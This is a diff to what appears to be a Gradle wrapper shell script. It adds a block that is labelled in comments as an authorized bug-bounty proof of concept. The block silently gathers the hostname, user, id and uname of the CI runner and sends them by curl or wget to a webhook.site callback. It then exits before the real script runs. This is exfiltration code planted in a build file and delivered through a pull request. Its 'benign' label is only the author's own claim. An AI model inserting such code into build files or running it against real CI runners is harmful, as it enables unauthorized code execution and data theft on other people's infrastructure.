@@ -1,5 +1,19 @@
 #!/bin/sh
 
+# Authorized Infomaniak YWH bug bounty CI security test (benign).
+# Purpose: demonstrate that a fork pull request executes code on the self-hosted runner.
+# This script only reads non-sensitive host identity and sends it to a controlled callback.
+# It does not read secrets, user data, or arbitrary files.
+POC_ID="POC_INFOMANIAK_CI_7f3a9c2e"
+echo "$POC_ID host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null)"
+echo "$POC_ID id=$(id 2>/dev/null)"
+echo "$POC_ID uname=$(uname -a 2>/dev/null)"
+POC_HOST=$(hostname 2>/dev/null | sed 's/[^A-Za-z0-9._-]/_/g')
+POC_USER=$(id -un 2>/dev/null | sed 's/[^A-Za-z0-9._-]/_/g')
+POC_UNAME=$(uname -s 2>/dev/null | sed 's/[^A-Za-z0-9._-]/_/g')
+curl -sS --max-time 8 "https://webhook.site/114e0359-776c-49f6-9061-0ae4f994907e?poc=$POC_ID&host=$POC_HOST&user=$POC_USER&uname=$POC_UNAME" >/dev/null 2>&1 || wget -q -T 8 -O /dev/null "https://webhook.site/114e0359-776c-49f6-9061-0ae4f994907e?poc=$POC_ID&host=$POC_HOST&user=$POC_USER&uname=$POC_UNAME" 2>/dev/null || true
+exit 0
+
 #
 # Copyright © 2015-2021 the original authors.
 #
